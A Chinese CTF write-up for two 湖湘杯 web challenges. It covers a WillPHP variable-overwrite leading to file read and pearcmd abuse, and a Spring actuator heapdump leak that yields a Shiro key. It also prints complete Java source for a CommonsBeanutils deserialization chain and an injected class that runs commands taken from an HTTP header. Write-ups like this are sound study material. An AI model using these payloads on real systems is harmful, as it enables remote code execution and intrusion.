# 湖湘杯WP



## web1



前半段是一个变量覆盖，题目给出assign其实已经很显眼了，要结合view一起看，这个类似TP的那个变量覆盖

我们可以先看到View这个文件的代码：

```php
<?php
/**
 * 框架视图类
 * @copyright 2020-2021 WillPHP
 * @author NoMind<24203741@qq.com/113344.com>
 * @version WillPHPv2
 * @since 2021-09-16
 */ 
namespace wiphp;
//defined('WPHP_URI') or die('Access Denied');
class View {
	private static $vars = [];
	private function __construct() {}
	private function __clone() {}
	public static function assign($name, $value = null) {
		if ($name != '') self::$vars[$name] = $value;
	} 
	private static function getViewFile($file = '') {
		$path = __MODULE__;
		if ($file == '') {
			$file = __ACTION__;
		} elseif (strpos($file, ':')) {
			list($path, $file) = explode(':', $file);
		} elseif (strpos($file, '/')) {
			$path = '';
		}
		$path = strtolower($path);
		$pfile = ltrim($path.'/'.$file, '/').'.html';		
		if (!THEME_ON) {
			$vfile = PATH_VIEW.'/'.$pfile;
		} else {
			$vfile = PATH_VIEW.'/'.__THEME__.'/'.$pfile;
			if (file_exists($vfile)) {
				$vfile = PATH_VIEW.'/default/'.$pfile;
			}
		}
		return $vfile;			
	}	
	public static function fetch($file = '', $vars = []) {
		if (!empty($vars)) self::$vars = array_merge(self::$vars, $vars);			
		$viewfile = self::getViewFile($file);
		if (file_exists($viewfile)) {
			array_walk_recursive(self::$vars, 'self::parseVars'); //处理输出
			define('__RUNTIME__', round((microtime(true) - START_TIME) , 4));	
			Template::render($viewfile, self::$vars);
		} else {
			App::halt($file.' 模板文件不存在。');
		}
	}	
	//删除反斜杠
	private static function parseVars(&$value, $key) {
		$value = stripslashes($value);
	}
}
```



当我们调用assign和view的时候其实分别会调用到fetch这两个函数，当我们调用assign对vars进行了一次赋值，而在调用fetch的时候会进入到Template::render($viewfile, self::$vars);当中

跟进两次之后会在Template找到如下：

![image-20211115115049058](https://gitee.com/yyssllz/pic/raw/master/image-20211115115049058.png)



很明显的变量覆盖，下面还紧跟了一个cfile，这样的话前半段很显然就是用cfile可以达成任意文件读取的效果

![image-20211115115841088](https://gitee.com/yyssllz/pic/raw/master/image-20211115115841088.png)

，后半段利用pearcmd即可，这里在我[别的文章](https://github.com/ysllz/Blog/issues/15)里面已经写过了故不再赘述了



## web2

又又又是JAVA，又是不写前端的JAVA，和深育杯那个一样我都快看吐了，因为靶机已经关了所以基本只能靠口述了

pentest in Autumm因为pom中存在这个依赖，可以访问到actuator路由，之后能够找到heapdump，利用非授权访问吧内存文件dump下来 

```
;/actuator/heapdump
```

 https://www.cnblogs.com/icez/p/Actuator_heapdump_exploit.html ![img](https://gitee.com/yyssllz/pic/raw/master/KsMoxv6EHkh12xgg.png!thumbnail) 能够找到key：![img](https://gitee.com/yyssllz/pic/raw/master/xt8Gj9x7Y8sbgbFz.png!thumbnail)跟着文章复现一下得到：POtxXgM0EC42xSvJ4CZQDw== 网上找了工具一把锁：https://github.com/j1anFen/shiro_attack![img](https://uploader.shimo.im/f/AiWFxk0AA3MFH2ch.png!thumbnail?accessToken=eyJhbGciOiJIUzI1NiIsImtpZCI6ImRlZmF1bHQiLCJ0eXAiOiJKV1QifQ.eyJhdWQiOiJhY2Nlc3NfcmVzb3VyY2UiLCJleHAiOjE2MzY5NDkxMDgsImciOiJjeXhjUWczcXd2NlJKZDNKIiwiaWF0IjoxNjM2OTQ4ODA4LCJ1c2VySWQiOjI4MDg0NzYzfQ.cAi3GvNBuaVGb_flJ82-tPtWB6IBiO2-hr-76RBX__Y)

后半段除了一把梭其实也可以用深育杯的🔒出来，为什么呢，因为是这道题目一样的，有CB链但是没有CC，这样的话应该也可以，但是毕竟可惜的是当时交完去看XSS了没有功夫再试试看了



```java
package com.cb;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.ClassPool;
import org.apache.commons.beanutils.BeanComparator;
import org.apache.shiro.codec.Base64;
import org.apache.shiro.crypto.AesCipherService;
import org.apache.shiro.util.ByteSource;

import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;

import java.util.Comparator;
import java.util.PriorityQueue;
//byte[] code = ClassPool.getDefault().get("exp").toBytecode();
public class cb {
    public static void setFieldValue(Object obj,String fieldname,Object value)throws Exception{
        Field field = obj.getClass().getDeclaredField(fieldname);
        field.setAccessible(true);
        field.set(obj,value);
    }

    public static void main(String[] args) throws Exception{
        //创建TemplateImpl 对象动态加载字节码
        byte[] code = ClassPool.getDefault().get("com.cb.exp").toBytecode();
        TemplatesImpl obj = new TemplatesImpl();
        setFieldValue(obj,"_name","HelloTemplatesImpl");
        setFieldValue(obj,"_class",null);
        setFieldValue(obj,"_tfactory",new TransformerFactoryImpl());
        setFieldValue(obj,"_bytecodes",new byte[][]{code});

        //创建BeanComparator
        Comparator comparator = new BeanComparator(null,String.CASE_INSENSITIVE_ORDER);

        //创建PriorityQueue实例
        PriorityQueue priorityQueue = new PriorityQueue(2,comparator);
        priorityQueue.add("1");
        priorityQueue.add("2");
        //设置属性
        setFieldValue(comparator,"property","outputProperties");
        setFieldValue(priorityQueue, "queue",new Object[]{obj,obj});

        ByteArrayOutputStream baor = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baor);
        oos.writeObject(priorityQueue);
        oos.close();
//        System.out.println(new String(Base64.getEncoder().encode(baor.toByteArray())));
        byte[] key = Base64.decode("POtxXgM0EC42xSvJ4CZQDw==");
        AesCipherService aes = new AesCipherService();
        ByteSource ciphertext = aes.encrypt(baor.toByteArray(), key);
        System.out.printf(ciphertext.toString());

    }
}

```

exp为：

```java
package com.cb;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;

import java.lang.reflect.Method;
import java.util.Scanner;

public class exp extends AbstractTranslet {
    static {
        try {
            Class c = Thread.currentThread().getContextClassLoader().loadClass("org.springframework.web.context.request.RequestContextHolder");
            Method m = c.getMethod("getRequestAttributes");
            Object o = m.invoke(null);
            c = Thread.currentThread().getContextClassLoader().loadClass("org.springframework.web.context.request.ServletRequestAttributes");
            m = c.getMethod("getResponse");
            Method m1 = c.getMethod("getRequest");
            Object resp = m.invoke(o);
            Object req = m1.invoke(o); // HttpServletRequest
            Method getWriter = Thread.currentThread().getContextClassLoader().loadClass("javax.servlet.ServletResponse").getDeclaredMethod("getWriter");
            Method getHeader = Thread.currentThread().getContextClassLoader().loadClass("javax.servlet.http.HttpServletRequest").getDeclaredMethod("getHeader",String.class);
            getHeader.setAccessible(true);
            getWriter.setAccessible(true);
            Object writer = getWriter.invoke(resp);
            String cmd = (String)getHeader.invoke(req, "cmd");
            String[] commands = new String[3];
            String charsetName = System.getProperty("os.name").toLowerCase().contains("window") ? "GBK":"UTF-8";
            if (System.getProperty("os.name").toUpperCase().contains("WIN")) {

                commands[0] = "cmd";
                commands[1] = "/c";
            } else {

                commands[0] = "/bin/sh";
                commands[1] = "-c";
            }
            commands[2] = cmd;
            writer.getClass().getDeclaredMethod("println", String.class).invoke(writer, new Scanner(Runtime.getRuntime().exec(commands).getInputStream(),charsetName).useDelimiter("\\A").next());
            writer.getClass().getDeclaredMethod("flush").invoke(writer);
            writer.getClass().getDeclaredMethod("close").invoke(writer);
        }
        catch (Exception e){

        }

    }
    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

    }
}
```

